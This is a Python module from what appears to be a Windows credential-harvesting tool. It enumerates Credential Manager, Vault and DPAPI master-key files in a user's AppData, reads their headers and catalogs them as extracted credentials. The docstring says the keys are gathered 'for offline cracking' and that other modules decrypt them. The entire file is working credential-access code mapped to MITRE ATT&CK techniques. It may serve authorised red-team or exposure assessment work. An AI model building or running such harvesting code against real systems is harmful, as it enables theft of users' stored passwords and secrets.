"""
DPAPIGrabber — Enumerate DPAPI-protected credential stores

Targets:
- DPAPI master key files (for offline cracking)
- Windows Credential Manager credential files
- Windows Vault files

This module discovers and catalogs DPAPI-protected stores. Actual
decryption of individual blobs is handled by _crypto.dpapi_decrypt()
in modules that need it (browser.py, etc.).

Requires: Admin privileges for full coverage
MITRE ATT&CK: T1555.004 (Windows Credential Manager), T1003.004 (LSA Secrets)
"""

from __future__ import annotations

import os

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel


class DPAPIGrabber(GrabberModule):
    name = "dpapi"
    description = "Enumerate DPAPI master keys and Windows Credential Manager files"
    min_privilege = PrivilegeLevel.USER  # Can discover files, admin needed for some decryption
    supported_platforms = ("Windows",)
    default_enabled = True

    _DPAPI_PATHS = [
        ("{appdata}/Microsoft/Credentials", "Credential Manager"),
        ("{localappdata}/Microsoft/Credentials", "Credential Manager (Local)"),
        ("{appdata}/Microsoft/Protect", "DPAPI Master Keys"),
        ("{localappdata}/Microsoft/Vault", "Windows Vault"),
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for template, _ in self._DPAPI_PATHS:
            path = template.format(
                appdata=context.appdata_roaming or "",
                localappdata=context.appdata_local or "",
            )
            if path and os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        for template, store_name in self._DPAPI_PATHS:
            path = template.format(
                appdata=context.appdata_roaming or "",
                localappdata=context.appdata_local or "",
            )
            if not path or not os.path.isdir(path):
                continue

            files = self._enumerate_credential_files(path)
            for file_info in files:
                result.credentials.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="key",
                    target_application=store_name,
                    url=file_info["path"],
                    encrypted_value=file_info.get("header", b""),
                    notes=f"size={file_info['size']} bytes",
                    mitre_technique="T1555.004",
                ))

            if files:
                result.findings.append(self.make_finding(
                    file_path=path,
                    description=f"Found {len(files)} {store_name} file(s)",
                    score=50 * min(len(files), 3),
                    matched_value=store_name,
                    snippets=[f["name"] for f in files[:5]],
                ))

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _enumerate_credential_files(directory: str) -> list[dict]:
        """Enumerate DPAPI credential files with metadata."""
        files = []
        try:
            for root, dirs, filenames in os.walk(directory):
                for fname in filenames:
                    fpath = os.path.join(root, fname)
                    try:
                        stat = os.stat(fpath)
                        # Read first 64 bytes as header for identification
                        header = b""
                        try:
                            with open(fpath, "rb") as f:
                                header = f.read(64)
                        except OSError:
                            pass

                        files.append({
                            "path": fpath,
                            "name": fname,
                            "size": stat.st_size,
                            "header": header,
                        })
                    except OSError:
                        continue
        except (PermissionError, OSError):
            pass
        return files
